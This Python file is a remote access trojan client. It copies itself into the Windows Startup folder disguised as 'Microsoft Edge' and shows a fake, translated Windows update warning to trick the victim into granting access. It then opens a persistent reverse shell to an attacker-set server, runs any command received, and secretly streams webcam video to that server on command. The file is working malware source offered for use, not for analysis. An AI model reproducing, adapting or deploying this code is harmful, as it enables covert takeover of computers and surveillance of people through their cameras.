import os
import shutil
import socket
import cv2
import numpy as np
import threading
import subprocess
import platform
import time
import sys
import ipaddress
from ftplib import FTP
from tkinter import messagebox
import ctypes
from langdetect import detect
from mtranslate import translate


global SERVER_HOST
global SERVER_PORT
global VIDEO_PORT
global START_VID_PORT

SERVER_HOST = 'SERVER_IP' # Modify this
SERVER_PORT = 65432
VIDEO_PORT = 9999
START_VID_PORT = 1111

button_pressed = False 

def fake_warn_pop():
    def get_windows_language():
        windll = ctypes.windll.kernel32
        buf = ctypes.create_unicode_buffer(255)
        windll.GetUserDefaultUILanguage(buf, ctypes.byref(buf), 255)
        return buf.value
    def detect_language(text):
        try:
            language = detect(text)
            return language
        except Exception as e:
            print("Error:", e)
            return None
    windows_language = get_windows_language()
    language_code = windows_language.split('-')[0]
    text_to_translate = "If prompted please enable access to  , to allow windows to update."
    detected_language = detect_language(text_to_translate)
    print(detected_language)
    windows_version = platform.system() + ' ' + platform.release()
    if detected_language:
        alrt = translate("Alert", language_code)
        translated_text = translate(text_to_translate, language_code)
        alert_txt = ""
        for i in range(len(translated_text)):
            alert_txt = alert_txt + translated_text[i]
            if i == 36:
                alert_txt = alert_txt + str(windows_version)
        messagebox.showinfo(alrt, alert_txt)
    else:
        messagebox.showinfo("Alert", "If prompted please enable access to "+str(windows_version)+", to allow windows to update.")

def execute_command(command):
    if platform.system() == "Windows":
        return subprocess.getoutput(command)
    else:
        return subprocess.getoutput(['/bin/bash', '-c', command])

def copy_to_startup():
    x=0
    try:
        script_path = os.path.abspath(__file__)
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        script_in_startup = os.path.join(startup_folder, os.path.basename(__file__))
        if not os.path.exists(script_in_startup):
            shutil.copy(script_path, startup_folder)
            _, extension = os.path.splitext(script_path)
            new_name = os.path.join(startup_folder, 'Microsoft Edge' + extension)  # Change 'new_name' to desired new name
            os.rename(script_in_startup, new_name)
            current_directory = os.path.dirname(os.path.abspath(__file__))
            for file_name in os.listdir(current_directory):
                if file_name.endswith('.exe'):
                    exe_path = os.path.join(current_directory, file_name)
                    try:
                        subprocess.Popen(exe_path)
                        print(f'Started {file_name}')
                    except Exception as e:
                        print(f'Failed to start {file_name}: {e}')
                        if x == 0:
                            fake_warn_pop()
                            x=1
            os.remove(script_path)
            os.system('start "" "{}"'.format(new_name))
            sys.exit()
    except:
        pass

def connect_to_server():
    global button_pressed
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((SERVER_HOST, SERVER_PORT))
                print("Connected to server")
                while True:
                    command = client_socket.recv(1024).decode()
                    if command == "start_video_transmission":
                        button_pressed = True
                    output = execute_command(command)
                    client_socket.sendall(output.encode())
        except Exception as e:
            print(f"Connection failed: {e}\n")
            print("Retrying in 5 seconds...\n")
            time.sleep(5)

def sendall(sock, data):
    total_sent = 0
    while total_sent < len(data):
        sent = sock.send(data[total_sent:])
        if sent == 0:
            raise RuntimeError("Socket connection broken")
        total_sent += sent

def check_camera():
    camera_list = []
    for i in range(10):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            camera_list.append(i)
            cap.release()
    return camera_list

def video_feed():
    global button_pressed
    print("Starting video feed")
    while True:
        try:
            video_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            video_client_socket.connect((SERVER_HOST, VIDEO_PORT))
            print("Connected to video server")
            if button_pressed:
                print("Button is pressed")
                available_cameras = check_camera()
                if available_cameras:
                    print("Cameras are available")
                    cap = cv2.VideoCapture(0)
                    cap.set(cv2.CAP_PROP_AUTOFOCUS, 0)
                    cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)
                    cap.set(cv2.CAP_PROP_EXPOSURE, -6)  
                    while button_pressed:
                        ret, frame = cap.read()
                        if not ret:
                            print("Error capturing frame.")
                            break
                        _, img_encoded = cv2.imencode('.jpg', frame)
                        frame_length = len(img_encoded)
                        sendall(video_client_socket, str(frame_length).ljust(16).encode())
                        sendall(video_client_socket, img_encoded.tobytes())
                    cap.release()
                else:
                    print("No hardware camera")
            else:
                print("Button is not pressed")
                while not button_pressed:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.connect((SERVER_HOST, START_VID_PORT))
                        while not button_pressed:
                            data = s.recv(1024)
                            if data.decode() == "vidcamstrt_":
                                button_pressed = True
                                break
                
            video_client_socket.close()
            print("Closed video socket")
        except Exception as e:
            print(f"Error: {e}")
            print("Reconnecting...")
            try:
                cap.release() 
                plt.show()
                button_pressed = False
            except:
                pass
            time.sleep(5)


copy_to_startup()

video_thread = threading.Thread(target=video_feed)
video_thread.start()

cons = threading.Thread(target=connect_to_server)
cons.start()

c = 0
while True:
    c += 1
    print("     -=  Loop ["+str(c)+"]  =-")
    time.sleep(5)
